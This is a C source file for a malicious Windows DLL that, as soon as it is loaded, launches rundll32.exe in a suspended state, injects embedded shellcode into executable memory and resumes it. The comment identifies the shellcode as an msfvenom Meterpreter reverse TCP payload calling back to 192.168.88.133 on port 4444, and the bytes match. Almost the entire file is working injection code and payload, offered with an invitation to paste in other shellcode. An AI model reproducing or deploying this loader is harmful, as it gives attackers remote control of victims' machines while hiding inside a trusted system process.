#include <windows.h>

/* Paste in your own shellcode */
#define SCSIZE 2048
/* msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.88.133 LPORT=4444 -f c */
unsigned char code[SCSIZE] = "\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
"\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
"\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
"\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
"\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
"\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
"\x8d\x5d\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c"
"\x77\x26\x07\xff\xd5\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68"
"\x29\x80\x6b\x00\xff\xd5\x6a\x05\x68\xc0\xa8\x58\x85\x68\x02"
"\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea"
"\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61"
"\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x61\x00\x00"
"\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83"
"\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a"
"\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57"
"\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x22\x58\x68\x00"
"\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68"
"\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\xe9\x71\xff\xff"
"\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
"\x53\xff\xd5";

/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
   
           BYTE *q = (BYTE *)p;
           size_t x = 0;
           for (x = 0; x < l; x++)
                     *(q++) = 0x00;
}


void ExecutePayload(void);

BOOL WINAPI
DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{
    switch (dwReason)
    {
        case DLL_PROCESS_ATTACH:
			ExecutePayload();
            break;

        case DLL_PROCESS_DETACH:
            // Code to run when the DLL is freed
            break;

        case DLL_THREAD_ATTACH:
            // Code to run when a thread is created during the DLL's lifetime
            break;

        case DLL_THREAD_DETACH:
            // Code to run when a thread ends normally.
            break;
    }
    return TRUE;
}

void ExecutePayload(void) {
    int error;
	PROCESS_INFORMATION pi;
	STARTUPINFO si;
	CONTEXT ctx;
	DWORD prot;
   LPVOID ep;

	// Start up the payload in a new process
	inline_bzero( &si, sizeof( si ));
	si.cb = sizeof(si);

	// Create a suspended process, write shellcode into stack, make stack RWX, resume it
	if(CreateProcess( 0, "rundll32.exe", 0, 0, 0, CREATE_SUSPENDED|IDLE_PRIORITY_CLASS, 0, 0, &si, &pi)) {
		ctx.ContextFlags = CONTEXT_INTEGER|CONTEXT_CONTROL;
		GetThreadContext(pi.hThread, &ctx);

	   ep = (LPVOID) VirtualAllocEx(pi.hProcess, NULL, SCSIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        WriteProcessMemory(pi.hProcess,(PVOID)ep, &code, SCSIZE, 0);

#ifdef _WIN64
	   ctx.Rip = (DWORD64)ep;
#else
	   ctx.Eip = (DWORD)ep;
#endif

        SetThreadContext(pi.hThread,&ctx);

        ResumeThread(pi.hThread);
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
	}
   // ExitProcess(0);
   // ExitThread(0);
}